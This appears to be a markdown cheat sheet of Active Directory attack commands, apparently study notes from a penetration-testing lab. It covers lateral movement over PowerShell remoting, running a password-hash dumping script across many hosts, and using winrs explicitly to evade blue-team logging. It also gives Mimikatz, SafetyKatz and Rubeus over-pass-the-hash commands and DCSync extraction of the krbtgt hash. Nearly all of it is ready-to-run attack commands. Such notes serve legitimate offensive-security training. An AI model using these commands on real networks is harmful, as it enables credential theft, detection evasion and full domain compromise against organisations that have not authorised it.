# Powershell Remoting
PS Remoting is a feature in windows server just like ssh in linux where administrators can perform tasks on remote machines without having to physically be present at each machine. It uses Windows Remote Management(WinRM) port 5985 http and 5986 https.
# Command to enable PSRemoting
```
Enable-PSRemoting -Force 
```
# Command to enable PSRemoting on remote machine
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```

# IF we have administrative access on another machine after use hunting
```
Enter-PSSession dcorp-adminsrv
```
OR
```
$session = New-PSSession -ComputerName dcorp-adminsrv
Enter-PSSession -Session $session
```
# TO execute commands parallely on many machines
If we have privilge to execute commands on many machines use below. Here create a file with names of computers to run commands on.
```
Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <server-lists>)
```
# To execute scripts prallely on many machines
Similarly as above create a file with names of computers/servers to run commands on.
```
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <server-lists>)
```
# To evade logging by blue team we can use winrs
```
winrs -remote:<server-name> -u:server1\administrator -p:Pass@123 hostname
```
# enable rdp access on another computer using scriptblock
```
Invoke-Command -ScriptBlock {Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
} -ComputerName dcorp-adminsrv
```

# Over Pass The Hash

Here, the needed aes256key, rc4 hash all can be got using mimikatz or safetykatz. Here, overpass the hash using any of the below techniques uses logon type 9 which means running whoami still shows as student1 or default username but we can access the remote resource like the domain controller simply by doing ```winrs -r:dcorp-dc cmd```

## Using Mimikatz( Needs elevation (Run as administrator))
```
Invoke-Mimikatz -Command '"sekurlsa::pth/user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
```
## Using safetykatz( Needs elevation (Run as administrator))
```
SafetyKatz.exe "sekurlsa::pth/user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```
## Using rubeus(doesn't need elevation)
```
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```
## Using rubeus(needs elevation)
```
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

# DCSync(Needs Domain Admin Privilege by default)
 DCSync is a late stage kill chain attack this means an attacker has hold of a user who has Active Directory Domain replication rights, domain replication is the method of updating objects from one DC to another DC and during this process the DC returns replication data to the requester including password hashes.

 ## DCSync to extract krbtgt hash for us domain
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 ```
 ## DCSync to extract krbtgt hash for us domain using safetykatz
 ```
 SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```